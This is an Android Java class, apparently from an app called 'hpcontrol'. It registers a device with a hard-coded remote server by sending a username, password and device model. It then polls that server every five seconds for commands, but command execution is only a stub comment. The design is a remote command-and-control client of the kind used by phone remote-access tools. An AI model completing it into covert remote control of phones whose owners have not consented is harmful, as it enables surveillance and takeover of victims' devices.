package com.hpcontrol;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramClient {
    private Context context;
    private String deviceId;
    private Handler handler;
    private Runnable commandChecker;
    private static final String BOT_API_URL = "https://Yanzstore90.pythonanywhere.com"; // Ganti dengan server lo
    
    public TelegramClient(Context context, String deviceId) {
        this.context = context;
        this.deviceId = deviceId;
        this.handler = new Handler(Looper.getMainLooper());
    }
    
    public void startCommandListener() {
        commandChecker = new Runnable() {
            @Override
            public void run() {
                checkCommands();
                handler.postDelayed(this, 5000); // Cek setiap 5 detik
            }
        };
        handler.post(commandChecker);
    }
    
    private void checkCommands() {
        new Thread(() -> {
            try {
                URL url = new URL(BOT_API_URL + "/get_commands?device_id=" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                
                // Parse JSON response
                // Execute commands...
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    public static void registerDevice(Context context, String username, String password, Callback callback) {
        new Thread(() -> {
            try {
                URL url = new URL(BOT_API_URL + "/register_device");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                
                JSONObject json = new JSONObject();
                json.put("username", username);
                json.put("password", password);
                json.put("device_name", android.os.Build.MODEL);
                
                conn.setDoOutput(true);
                OutputStream os = conn.getOutputStream();
                os.write(json.toString().getBytes());
                os.flush();
                
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String response = reader.readLine();
                
                JSONObject result = new JSONObject(response);
                if (result.getBoolean("success")) {
                    callback.onSuccess(result.getString("device_id"));
                } else {
                    callback.onError(result.getString("error"));
                }
            } catch (Exception e) {
                callback.onError(e.getMessage());
            }
        }).start();
    }
    
    public interface Callback {
        void onSuccess(String deviceId);
        void onError(String error);
    }
}